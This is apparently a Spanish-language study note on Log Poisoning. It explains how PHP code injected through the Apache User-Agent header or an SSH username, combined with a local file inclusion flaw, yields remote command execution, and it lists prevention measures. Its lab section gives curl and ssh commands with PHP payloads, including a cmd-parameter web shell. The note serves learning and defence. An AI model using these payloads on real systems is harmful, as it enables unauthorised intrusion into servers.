---
aliases: ["Log Poisoning"]
tags:
  - hacking/explotacion
  - hacking/web
  - hacking/laboratorios
  - linux/comandos
  - redes/conceptos
estado: 🟢 Terminado
---
# Log Poisoning

El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** (Local File Inclusion) para lograr una **ejecución remota de comandos** (RCE) en el servidor.

> [!info] ¿Qué es el Log Poisoning?
> El Log Poisoning explota la confianza implícita en los archivos de registro. Al inyectar código malicioso en una entrada que será registrada (como un `User-Agent` o un nombre de usuario de SSH), y luego forzar a la aplicación a leer o interpretar ese log a través de una vulnerabilidad como LFI, el atacante puede lograr la ejecución de código arbitrario en el servidor.

Como ejemplos para esta clase, trataremos de envenenar los recursos ‘`auth.log`‘ de **SSH** y ‘`access.log`‘ de **Apache**, comenzando mediante la explotación de una vulnerabilidad LFI primeramente para acceder a estos archivos de registro. Una vez hayamos logrado acceder a estos archivos, veremos cómo manipularlos para incluir código malicioso.

En el caso de los logs de SSH, el atacante puede inyectar código PHP en el campo de **usuario** durante el proceso de autenticación. Esto permite que el código se registre en el log ‘`auth.log`‘ de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.

En el caso del archivo ‘`access.log`‘ de Apache, el atacante puede inyectar código PHP en el campo **User-Agent** de una solicitud HTTP. Este código malicioso se registra en el archivo de registro ‘`access.log`‘ de Apache y se ejecuta cuando el archivo de registro es leído. De esta manera, el atacante también puede lograr una ejecución remota de comandos en el servidor.

> [!tip] Rutas comunes de logs
> Las rutas de los archivos de registro pueden variar según la distribución de Linux y la configuración del servicio. Algunas rutas comunes incluyen:
> *   **Apache `access.log`**: `/var/log/apache2/access.log` (Debian/Ubuntu), `/var/log/httpd/access_log` (Red Hat/CentOS)
> *   **Apache `error.log`**: `/var/log/apache2/error.log` (Debian/Ubuntu), `/var/log/httpd/error_log` (Red Hat/CentOS)
> *   **SSH `auth.log`**: `/var/log/auth.log` (Debian/Ubuntu)
> *   **SSH `btmp` (intentos fallidos)**: `/var/log/btmp` (Red Hat/CentOS y a veces Debian/Ubuntu para fallos)
> *   **SSH `wtmp` (conexiones exitosas)**: `/var/log/wtmp`

Cabe destacar que en algunos sistemas, el archivo ‘`auth.log`‘ no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como ‘`btmp`‘.

Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo ‘`auth.log`‘. Sin embargo, en sistemas basados en Red Hat y CentOS, los eventos de autenticación de SSH se registran en el archivo ‘`btmp`‘. Aunque a veces pueden haber excepciones.

Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.

> [!warning] Medidas de Prevención
> Para mitigar el riesgo de Log Poisoning y LFI:
> *   **Validación de Entradas**: Implementar una validación estricta de todas las entradas del usuario, incluyendo `User-Agent` y nombres de usuario, para evitar la inyección de caracteres especiales o código.
> *   **Permisos de Archivos**: Asegurar que los archivos de registro tengan permisos restrictivos, de modo que solo los procesos necesarios puedan escribir en ellos y que el servidor web no tenga permisos de lectura sobre logs sensibles o que no deba servir.
> *   **Configuración de PHP**: Deshabilitar funciones PHP peligrosas como `system()`, `exec()`, `shell_exec()`, `passthru()`, `eval()` en `php.ini` usando `disable_functions`.
> *   **Configuración del Servidor Web**: Configurar el servidor web para que no interprete archivos de registro como código ejecutable (por ejemplo, no permitir la ejecución de PHP en directorios de logs).
> *   **WAF/IDS**: Utilizar Web Application Firewalls (WAF) y Sistemas de Detección de Intrusiones (IDS) para detectar y bloquear intentos de inyección.

## Notas de la práctica

Se creó una máquina donde tenemos un [[Local File Inclusion]] muy básico pero que nos va a servir para comprender el concepto:

![[Pasted image 20250825170217.png]]

Como podemos observar, ya tenemos el [[Local File Inclusion]] y el objetivo es ver si nosotros podemos ver los logs del servicio en la ruta `/var/log/apache2/access.log` el cual almacena todas las peticiones que se reciben:

![[Pasted image 20250825170516.png]]

Sin importar el código de estado, siempre se almacenarán aquí. Algo a tener en cuenta es que los usuarios pertenecientes al grupo `adm` pueden mirar logs.

En este punto vamos a ver si logramos listar esto desde la web:
![[Pasted image 20250825170731.png]]

Como podemos observar, sí podemos ver los logs. En este punto lo que vamos a hacer es primero comprender que lo de `Mozilla/5.0....` es el `User-Agent` del dispositivo que envía las peticiones. Nosotros este campo, al momento de hacer una consulta, lo podemos cambiar de la siguiente manera:

```bash
curl -s -X GET "http://192.168.1.70/probando" -H "User-Agent: PROBANDO"
```

![[Pasted image 20250825171038.png]]

Podemos ver que el `User-Agent` cambió y ya esto es suficiente para, en este caso, inyectar código PHP con el objetivo de que se interprete:

```bash
curl -s -X GET "http://192.168.1.70/probando" -H "User-Agent: <?php system('whoami'); ?>"
```

![[Pasted image 20250825171215.png]]

Vemos que efectivamente logramos ejecutar el comando.

Ahora, si queremos saber si la función `system` está activa, podemos hacer:

```bash
curl -s -X GET "http://192.168.1.70/probando" -H "User-Agent: <?php phpinfo(); ?>"
```

![[Pasted image 20250825171414.png]]

El propósito de esto es ver qué funciones están deshabilitadas en el campo de `disable_functions`. Si no vemos nada, pues podemos usar cualquier función y podemos seguir con el ataque.

> [!info] `system()` vs `phpinfo()`
> *   La función `system()` en PHP ejecuta un comando externo y muestra la salida. Es una de las funciones más comunes para lograr RCE.
> *   La función `phpinfo()` muestra una gran cantidad de información sobre la configuración actual de PHP, incluyendo las variables de entorno, módulos cargados, y lo más importante para este ataque, la directiva `disable_functions` que lista las funciones que han sido deshabilitadas por seguridad.

```bash
curl -s -X GET "http://192.168.1.70/probando" -H "User-Agent: <?php system(\_GET['cmd']); ?>"
```

![[Pasted image 20250825171943.png]]

Ahora, otros logs de los que se pueden abusar es SSH, por lo que puede estar en dos rutas: `/var/log/auth.log` o `/var/log/btmp`. Por lo que si tratamos de ver alguno de ellos, veremos las conexiones del servicio:

![[Pasted image 20250825172226.png]]

Si nos fijamos, el input que controlamos y está en el log es el usuario, por lo que será en este donde intentemos la inyección.
Entonces, lo que vamos a hacer sería lo siguiente:

```bash
ssh '<?php system("whoami"); ?>'@localhost
```

Y si revisamos los logs desde la web, podremos ver cómo se ejecuta el comando:

> [!warning] Vulnerabilidad SSH Parcheada
> Es importante notar que la inyección de código PHP directamente en el nombre de usuario de SSH para Log Poisoning es una técnica que ha sido parcheada en muchas distribuciones modernas. Los servidores SSH suelen sanear o codificar las entradas de usuario antes de escribirlas en `auth.log` o `btmp`, lo que impide la interpretación de código PHP. Este ejemplo es más ilustrativo del concepto que de una vulnerabilidad activa en sistemas actualizados.

vulnerabilidad SSH parcheada.